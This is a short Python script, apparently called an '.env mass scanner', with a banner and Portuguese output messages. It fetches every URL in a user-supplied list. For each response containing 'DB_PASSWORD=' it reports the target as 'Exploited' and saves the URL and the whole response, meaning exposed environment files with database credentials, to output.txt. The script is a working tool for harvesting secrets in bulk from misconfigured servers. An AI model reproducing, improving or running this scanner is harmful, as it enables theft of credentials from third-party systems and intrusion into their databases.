import requests as mr
import os.path
import os


if os.path.exists('output.txt'):
    bk = 'seu merda'
else:
    fh = open('output.txt', "w")


expltd_count = int(0)
nexpltd_count = int(0)



banner = """
                                                                      
                                                                      
       ___ _ ____   __  _ __ ___   __ _ ___ ___   ___  ___ __ _ _ __  
      / _ \ '_ \ \ / / | '_ ` _ \ / _` / __/ __| / __|/ __/ _` | '_ \ 
  _  |  __/ | | \ V /  | | | | | | (_| \__ \__ \ \__ \ (_| (_| | | | |      coded by Luan Devecchi
 (_)  \___|_| |_|\_/   |_| |_| |_|\__,_|___/___/ |___/\___\__,_|_| |_|
                                                                      
                                                                      
"""


print(banner)

lista = str(input("""\033[36m
[+] \033[35mURL List =>: \033[0;0m"""))

lista = open(lista , 'r').readlines()
lista = [linha.replace('\n' , '') for linha in lista]



for linha in lista:

  req =  mr.get(linha).text
  if 'DB_PASSWORD=' in req:
    print('💈 URL  {} Exploited 💈\n'.format(linha))
    openout = open('output.txt' , 'a')
    openout.write('{} || \n {}\n'.format(linha,req))
    expltd_count = expltd_count + 1
  else:
    nexpltd_count = nexpltd_count + 1
    print('💈  {} Not vunerable :| 💈\n'.format(linha))

print('💈  {} \033[36mAlvos exploitado(s) \033[0;0m|| {} \033[35mNão vulneravel(is) \033[0;0m|| 💈'.format(expltd_count,nexpltd_count))
